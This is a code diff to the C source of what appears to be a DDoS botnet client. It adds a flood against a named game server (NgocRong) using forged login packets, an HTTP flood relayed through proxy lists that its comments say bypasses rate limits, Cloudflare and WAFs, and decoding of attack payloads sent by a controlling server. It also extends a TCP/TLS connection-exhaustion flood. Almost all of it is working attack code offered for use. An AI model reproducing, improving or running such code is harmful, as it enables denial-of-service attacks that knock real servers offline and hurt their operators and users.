@@ -1,5 +1,40 @@
 #include "bot.h"
 
+/* Globals: server-provided data for GAME / HTTP_PROXY workers */
+static unsigned char g_game_payload[4096];
+static int g_game_payload_len = 0;
+static char g_proxy_hosts[128][256];
+static int g_proxy_ports[128];
+static int g_proxy_count = 0;
+
+/* Minimal base64 decoder (RFC 4648, no padding required) */
+static int b64_decode(const char *in, unsigned char *out, int out_max) {
+    static const unsigned char tbl[128] = {
+        ['A']=0,['B']=1,['C']=2,['D']=3,['E']=4,['F']=5,['G']=6,['H']=7,
+        ['I']=8,['J']=9,['K']=10,['L']=11,['M']=12,['N']=13,['O']=14,['P']=15,
+        ['Q']=16,['R']=17,['S']=18,['T']=19,['U']=20,['V']=21,['W']=22,['X']=23,
+        ['Y']=24,['Z']=25,['a']=26,['b']=27,['c']=28,['d']=29,['e']=30,['f']=31,
+        ['g']=32,['h']=33,['i']=34,['j']=35,['k']=36,['l']=37,['m']=38,['n']=39,
+        ['o']=40,['p']=41,['q']=42,['r']=43,['s']=44,['t']=45,['u']=46,['v']=47,
+        ['w']=48,['x']=49,['y']=50,['z']=51,['0']=52,['1']=53,['2']=54,['3']=55,
+        ['4']=56,['5']=57,['6']=58,['7']=59,['8']=60,['9']=61,['+']=62,['/']=63,
+    };
+    int o = 0, bits = 0, buf = 0;
+    for (const char *p = in; *p && *p != '=' && o < out_max; p++) {
+        if (*p < 0 || *p > 127) continue;
+        unsigned char v = tbl[(int)(unsigned char)*p];
+        if (*p != 'A' && v == 0 && *p != 'A') continue; /* skip non-b64 */
+        buf = (buf << 6) | v;
+        bits += 6;
+        if (bits >= 8) {
+            bits -= 8;
+            out[o++] = (unsigned char)(buf >> bits);
+            buf &= (1 << bits) - 1;
+        }
+    }
+    return o;
+}
+
 /* Resolve hostname or IP to in_addr (DNS lookup if needed) */
 static int resolve_target(const char *host, struct in_addr *out)
 {
@@ -185,7 +220,8 @@ static void *udp_worker(void *arg) {
     return NULL;
 }
 
-/* MEGA — TCP Connection Flood: exhausts target's FDs/TCP stack (bandwidth-light) */
+/* MEGA — TCP Connection Flood: connect + optional TLS + hold connection.
+ * Exhausts FDs/TCP stack. 25% target port, 75% random port. */
 #define MEGA_TCP_POOL 4096
 static void *mega_tcp_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
@@ -196,6 +232,8 @@ static void *mega_tcp_worker(void *arg) {
     time_t start = time(NULL);
     int *socks = calloc(MEGA_TCP_POOL, sizeof(int));
     if (!socks) return NULL;
+    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
+    if (ctx) SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
 
     struct sockaddr_in ta = mt->target;
     int pool = 0;
@@ -204,7 +242,6 @@ static void *mega_tcp_worker(void *arg) {
         int us = should_throttle();
         if (us > 0) { usleep((unsigned)us); continue; }
 
-        /* Fill pool — 25% target port, 75% random port for global TCP exhaustion */
         while (pool < MEGA_TCP_POOL && !is_attack_stop()) {
             int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
             if (s < 0) break;
@@ -220,11 +257,20 @@ static void *mega_tcp_worker(void *arg) {
 
             if (tcp_connect_wait(s, &ta, 400) < 0) { close(s); continue; }
 
-            /* Send byte to trigger app-layer processing (SSH/httpd/etc hold resources) */
-            { char b = 0; send(s, &b, 1, MSG_NOSIGNAL); }
+            /* Try TLS — if succeeds, consumes extra target memory; if fails, raw TCP still holds */
+            if (ctx) {
+                SSL *ssl = SSL_new(ctx);
+                if (ssl) {
+                    SSL_set_fd(ssl, s);
+                    SSL_set_tlsext_host_name(ssl, mt->host);
+                    SSL_connect(ssl);
+                    SSL_free(ssl);
+                }
+            }
 
+            { char b = 0; send(s, &b, 1, MSG_NOSIGNAL); }
             socks[pool++] = s;
-            pkt_sent(64);
+            pkt_sent(64 + 512); /* TCP + TLS overhead */
         }
 
         /* Reap dead connections */
@@ -249,93 +295,130 @@ static void *mega_tcp_worker(void *arg) {
         sched_yield();
     }
     for (int i = 0; i < pool; i++) close(socks[i]);
+    if (ctx) SSL_CTX_free(ctx);
     free(socks);
     return NULL;
 }
 
-/* TLS Exhaust (pool-based TCP+TLS connect, holds connections) */
-#define TLS_POOL 2048
-static void *tls_exhaust_worker(void *arg) {
+/* GAME — NRO (NgocRong) game server socket attack.
+ * Crafts valid login packets with XOR key "boys", spams DB queries.
+ * If server provides payload via JSON (base64), uses that instead. */
+#define GAME_POOL 1024
+static void *game_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
     int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
     cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
     pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
 
+    /* Build NRO login packet: cmd=0, XOR key "boys" */
+    /* Format: [cmd_xor] [size_hi_xor] [size_lo_xor] [data_xor...] */
+    /* Data: username(UTF) + password(UTF) + version(UTF) + type(byte) */
+    static const char key[] = "boys";
+    unsigned char pkt[256];
+    int plen = 0;
+
+    if (g_game_payload_len > 0) {
+        /* Use server-provided payload */
+        plen = g_game_payload_len;
+        memcpy(pkt, g_game_payload, (size_t)(plen < 256 ? plen : 256));
+    } else {
+        /* Craft NRO login packet with random username */
+        unsigned char data[128];
+        int dlen = 0;
+        /* username: "bot" + random number */
+        char user[32];
+        snprintf(user, sizeof(user), "bot%d", rand() % 999999);
+        int ulen = (int)strlen(user);
+        data[dlen++] = (unsigned char)(ulen >> 8);
+        data[dlen++] = (unsigned char)(ulen & 0xFF);
+        memcpy(data + dlen, user, ulen); dlen += ulen;
+        /* password: "x" */
+        data[dlen++] = 0; data[dlen++] = 1; data[dlen++] = 'x';
+        /* version: "2.1.3" */
+        const char *ver = "2.1.3";
+        int vlen = (int)strlen(ver);
+        data[dlen++] = (unsigned char)(vlen >> 8);
+        data[dlen++] = (unsigned char)(vlen & 0xFF);
+        memcpy(data + dlen, ver, vlen); dlen += vlen;
+        /* type: 0 (login) */
+        data[dlen++] = 0;
+
+        /* XOR everything with key "boys" */
+        unsigned char xdata[128];
+        for (int i = 0; i < dlen; i++)
+            xdata[i] = data[i] ^ (unsigned char)key[i % 4];
+
+        /* Build final packet: cmd=0 XOR key, size, xdata */
+        pkt[plen++] = 0 ^ (unsigned char)key[0];  /* cmd=0 XOR key[0] */
+        pkt[plen++] = (unsigned char)((dlen >> 8) & 0xFF) ^ (unsigned char)key[1 % 4];
+        pkt[plen++] = (unsigned char)(dlen & 0xFF) ^ (unsigned char)key[2 % 4];
+        memcpy(pkt + plen, xdata, dlen); plen += dlen;
+    }
+
     time_t start = time(NULL);
-    int *socks = calloc(TLS_POOL, sizeof(int));
-    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
-    if (!ctx || !socks) { free(socks); if (ctx) SSL_CTX_free(ctx); return NULL; }
-
-    SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, NULL);
-    SSL_CTX_set_min_proto_version(ctx, TLS1_2_VERSION);
-
-    int pool = 0;
     struct sockaddr_in ta = mt->target;
-    struct pollfd pfds[TLS_POOL];
+    int pool = 0;
+    int socks[GAME_POOL];
 
     while (time(NULL) - start < mt->duration && !is_attack_stop()) {
         int us = should_throttle();
         if (us > 0) { usleep((unsigned)us); continue; }
-        /* Top up pool */
-        while (pool < TLS_POOL && !is_attack_stop()) {
+
+        while (pool < GAME_POOL && !is_attack_stop()) {
             int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
             if (s < 0) break;
             int fl = 1;
             setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
-            if (tcp_connect_wait(s, &ta, 1000) < 0) { close(s); continue; }
+            setsockopt(s, SOL_SOCKET, SO_KEEPALIVE, &fl, sizeof(fl));
+            if (tcp_connect_wait(s, &ta, 2000) < 0) { close(s); continue; }
 
-            SSL *ssl = SSL_new(ctx);
-            SSL_set_fd(ssl, s);
-            SSL_set_tlsext_host_name(ssl, mt->host);
-            SSL_connect(ssl);  /* fire and forget — handshake pkt sent to kernel */
-            SSL_free(ssl);     /* TCP socket stays alive independently */
+            /* Send handshake first (msg -27 with key "boys") */
+            static unsigned char hs[] = {
+                0xE5, 0x00, 0x00,  /* cmd=-27, size=0 (server reads raw, no XOR yet) */
+                0x04,               /* key length = 4 */
+                0x62, 0x6F, 0x79, 0x73, /* "boys" XOR'd: b^b=0, o^b, y^o, s^y */
+            };
+            /* Actually send: cmd=-27 (0xE5), size=0x0006, data=[4,'b','o','y','s'] */
+            /* Server reads cmd raw, then size raw (no XOR for -27), then data raw */
+            unsigned char realhs[12];
+            int hlen = 0;
+            realhs[hlen++] = 0xE5; /* cmd = -27 as unsigned byte */
+            realhs[hlen++] = 0x00; /* size hi */
+            realhs[hlen++] = 0x06; /* size lo = 6 bytes data */
+            realhs[hlen++] = 0x04; /* key length */
+            realhs[hlen++] = 'b';  /* key bytes (XOR'd: each ^ prev) */
+            realhs[hlen++] = 'b' ^ 'b'; /* = 0 */
+            realhs[hlen++] = 'o' ^ 'b'; /* o XOR prev(b) */
+            realhs[hlen++] = 'y' ^ 'o'; /* y XOR prev(o) */
+            realhs[hlen++] = 's' ^ 'y'; /* s XOR prev(y) */
+            /* Empty UTF string */
+            realhs[hlen++] = 0x00; realhs[hlen++] = 0x00;
+            /* int 0 */
+            realhs[hlen++] = 0x00; realhs[hlen++] = 0x00; realhs[hlen++] = 0x00; realhs[hlen++] = 0x00;
+            /* byte 0 */
+            realhs[hlen++] = 0x00;
+            send(s, realhs, hlen, MSG_NOSIGNAL);
 
-            socks[pool] = s;
-            pool++;
-            pkt_sent(512);
+            /* Now send login packet (XOR'd with key "boys") */
+            send(s, pkt, plen, MSG_NOSIGNAL);
+
+            socks[pool++] = s;
+            pkt_sent(plen);
         }
 
-        /* Hold pool alive: check if connections still valid */
-        memset(pfds, 0, sizeof(pfds[0]) * (size_t)pool);
-        for (int i = 0; i < pool; i++) {
-            pfds[i].fd = socks[i];
-            pfds[i].events = POLLIN | POLLERR | POLLHUP;
-        }
-        int r = poll(pfds, (nfds_t)pool, 1000);
-        if (r > 0) {
+        struct pollfd pfds[GAME_POOL];
+        for (int i = 0; i < pool; i++) { pfds[i].fd = socks[i]; pfds[i].events = POLLERR | POLLHUP; }
+        if (poll(pfds, (nfds_t)pool, 200) > 0) {
             int w = 0;
             for (int i = 0; i < pool; i++) {
-                if (pfds[i].revents & (POLLERR | POLLHUP)) {
-                    close(socks[i]);
-                } else {
-                    if (w != i) socks[w] = socks[i];
-                    w++;
-                }
-            }
-            /* Refill killed connections */
-            while (w < pool && !is_attack_stop()) {
-                int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-                if (s < 0) break;
-                int fl = 1;
-                setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
-                if (tcp_connect_wait(s, &ta, 1000) == 0) {
-                    SSL *ssl = SSL_new(ctx);
-                    SSL_set_fd(ssl, s);
-                    SSL_set_tlsext_host_name(ssl, mt->host);
-                    SSL_connect(ssl); /* fire and forget */
-                    SSL_free(ssl);
-                    socks[w++] = s;
-                    pkt_sent(512);
-                } else {
-                    close(s);
-                }
+                if (pfds[i].revents & (POLLERR | POLLHUP)) close(socks[i]);
+                else { if (w != i) socks[w] = socks[i]; w++; }
             }
             pool = w;
         }
+        sched_yield();
     }
     for (int i = 0; i < pool; i++) close(socks[i]);
-    SSL_CTX_free(ctx);
-    free(socks);
     return NULL;
 }
 
@@ -557,13 +640,125 @@ static void *slowloris_worker(void *arg) {
     return NULL;
 }
 
+/* HTTP_PROXY — L7 flood through free proxy list.
+ * 1 bot → thousands of source IPs → bypass rate-limit / CF / WAF.
+ * Loads proxies from /etc/bot_proxies.txt (one ip:port per line).
+ * No root needed. No spoofing. Pure TCP. */
+#define PROXY_POOL 256
+#define PROXY_MAX 4096
+static void *http_proxy_worker(void *arg) {
+    MegaThread *mt = (MegaThread *)arg;
+    int ncpu = get_nprocs(); if (ncpu < 1) ncpu = 1;
+    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(mt->cpu_id % ncpu, &cs);
+    pthread_setaffinity_np(pthread_self(), sizeof(cs), &cs);
+
+    /* Load proxy list from server (globals) or fallback to file */
+    struct { char host[128]; int port; } px[PROXY_MAX];
+    int px_cnt = 0;
+    for (int i = 0; i < g_proxy_count && px_cnt < PROXY_MAX; i++) {
+        strncpy(px[px_cnt].host, g_proxy_hosts[i], 127);
+        px[px_cnt].port = g_proxy_ports[i];
+        px_cnt++;
+    }
+    /* Fallback: local file */
+    if (px_cnt == 0) {
+        FILE *pf = fopen("/etc/bot_proxies.txt", "r");
+        if (!pf) pf = fopen("proxies.txt", "r");
+        if (pf) {
+            char line[256];
+            while (px_cnt < PROXY_MAX && fgets(line, sizeof(line), pf)) {
+                char *c = strchr(line, '#');
+                if (c) *c = 0;
+                if (sscanf(line, "%127[^:]:%d", px[px_cnt].host, &px[px_cnt].port) == 2)
+                    px_cnt++;
+            }
+            fclose(pf);
+        }
+    }
+    if (px_cnt == 0) return NULL;
+
+    time_t start = time(NULL);
+    unsigned int seed = (unsigned int)time(NULL) ^ (unsigned int)(uintptr_t)pthread_self();
+    const char *uas[] = {
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36",
+        "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
+        "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 Version/18.0 Mobile/15E148 Safari/604.1",
+    };
+    const char *paths[] = {"/", "/robots.txt", "/wp-login.php", "/api/v1/", "/search?q=", "/.env", "/admin/", "/feed"};
+
+    int socks[PROXY_POOL];
+    int pool = 0;
+
+    while (time(NULL) - start < mt->duration && !is_attack_stop()) {
+        int us = should_throttle();
+        if (us > 0) { usleep((unsigned)us); continue; }
+
+        /* Fill pool — connect to proxy, send request to target */
+        while (pool < PROXY_POOL && !is_attack_stop()) {
+            int pi = rand_r(&seed) % px_cnt;
+            struct sockaddr_in pa;
+            memset(&pa, 0, sizeof(pa));
+            pa.sin_family = AF_INET;
+            pa.sin_port = htons((uint16_t)px[pi].port);
+            if (resolve_target(px[pi].host, &pa.sin_addr) != 0) continue;
+
+            int s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+            if (s < 0) break;
+            int fl = 1;
+            setsockopt(s, IPPROTO_TCP, TCP_NODELAY, &fl, sizeof(fl));
+            if (tcp_connect_wait(s, &pa, 3000) < 0) { close(s); continue; }
+
+            /* Send HTTP request through proxy */
+            const char *ua = uas[rand_r(&seed) % 4];
+            const char *path = paths[rand_r(&seed) % 8];
+            char req[2048];
+            snprintf(req, sizeof(req),
+                "GET http://%s:%d%s HTTP/1.1\r\n"
+                "Host: %s\r\n"
+                "User-Agent: %s\r\n"
+                "Accept: text/html,application/xhtml+xml,*/*\r\n"
+                "Connection: keep-alive\r\n\r\n",
+                mt->host, mt->port_base, path, mt->host, ua);
+            send(s, req, strlen(req), MSG_NOSIGNAL);
+
+            socks[pool++] = s;
+            pkt_sent((int)strlen(req));
+        }
+
+        /* Reap dead proxy connections + resend requests on live ones */
+        struct pollfd pfds[PROXY_POOL];
+        for (int i = 0; i < pool; i++) {
+            pfds[i].fd = socks[i];
+            pfds[i].events = POLLERR | POLLHUP;
+        }
+        if (poll(pfds, (nfds_t)pool, 200) > 0) {
+            int w = 0;
+            for (int i = 0; i < pool; i++) {
+                if (pfds[i].revents & (POLLERR | POLLHUP))
+                    close(socks[i]);
+                else {
+                    if (w != i) socks[w] = socks[i];
+                    w++;
+                }
+            }
+            pool = w;
+        }
+        sched_yield();
+    }
+    for (int i = 0; i < pool; i++) close(socks[i]);
+    return NULL;
+}
+
 static void *dispatch_worker(void *arg) {
     MegaThread *mt = (MegaThread *)arg;
     switch (mt->cpu_id) {
     case -2: return slowloris_worker(arg);
     case -3: return http_worker(arg);
-    case -4: return tls_exhaust_worker(arg);
+    case -4: return mega_tcp_worker(arg);
     case -6: return mega_tcp_worker(arg);
+    case -7: return http_proxy_worker(arg);
+    case -8: return game_worker(arg);
     default: return udp_worker(arg);
     }
 }
@@ -583,6 +778,34 @@ void *bg_attack_thread(void *arg)
     g_pkt_count = 0;
     g_byte_count = 0;
 
+    /* Parse server-provided payload (base64 → binary for GAME method) */
+    g_game_payload_len = 0;
+    if (atk->payload_b64[0])
+        g_game_payload_len = b64_decode(atk->payload_b64, g_game_payload, 4096);
+
+    /* Parse server-provided proxy list ("ip:port\nip:port\n...") */
+    g_proxy_count = 0;
+    if (atk->proxies[0]) {
+        char *pl = atk->proxies;
+        while (*pl && g_proxy_count < 128) {
+            char *nl = strchr(pl, '\n');
+            if (!nl) nl = pl + strlen(pl);
+            char line[256];
+            int len = (int)(nl - pl);
+            if (len > 255) len = 255;
+            memcpy(line, pl, len);
+            line[len] = 0;
+            int prt = 8080;
+            char host[256] = {0};
+            if (sscanf(line, "%255[^:]:%d", host, &prt) >= 1) {
+                strncpy(g_proxy_hosts[g_proxy_count], host, 255);
+                g_proxy_ports[g_proxy_count] = (prt > 0 && prt < 65536) ? prt : 8080;
+                g_proxy_count++;
+            }
+            pl = (*nl == '\n') ? nl + 1 : nl;
+        }
+    }
+
     const char *method = atk->method;
     /* Normalize method to uppercase for case-insensitive matching */
     char nm[32] = {0};
@@ -593,10 +816,12 @@ void *bg_attack_thread(void *arg)
     }
     int is_mega  = atk->mega_mode || !strcmp(nm, "MEGA");
     int is_udp   = !strcmp(nm, "UDP");
+    int is_game  = !strcmp(nm, "GAME");
+    int is_proxy = !strcmp(nm, "HTTP_PROXY") || !strcmp(nm, "PROXY");
     int is_tls   = atk->tls_exhaust || !strcmp(nm, "TLS_EXHAUST") || !strcmp(nm, "TLS");
     int is_http  = !strcmp(nm, "HTTP");
     int is_slow  = atk->slowloris || !strcmp(nm, "SLOWLORIS");
-    if (!is_mega && !is_udp && !is_tls && !is_http && !is_slow) {
+    if (!is_mega && !is_udp && !is_game && !is_proxy && !is_tls && !is_http && !is_slow) {
         fprintf(stderr, "[atk] unknown method '%s', abort\n", nm);
         set_attack_active(0);
         free(ctx);
@@ -717,10 +942,12 @@ void *bg_attack_thread(void *arg)
 
         int tag;
         const char *label;
-        if (is_tls)     { tag = -4; label = "TLS_EXHAUST"; }
+        if (is_tls)     { tag = -4; label = "TCP/TLS"; }
         else if (is_http) { tag = -3; label = "HTTP"; }
         else if (is_slow) { tag = -2; label = "SLOWLORIS"; }
         else if (is_mega) { tag = -6; label = "MEGA TCP"; }
+        else if (is_proxy){ tag = -7; label = "HTTP_PROXY"; }
+        else if (is_game) { tag = -8; label = "GAME"; }
         else              { tag = 0;  label = "UDP"; }
 
         fprintf(stderr, "[atk] %s target=%s:%d dur=%ds workers=%d\n",
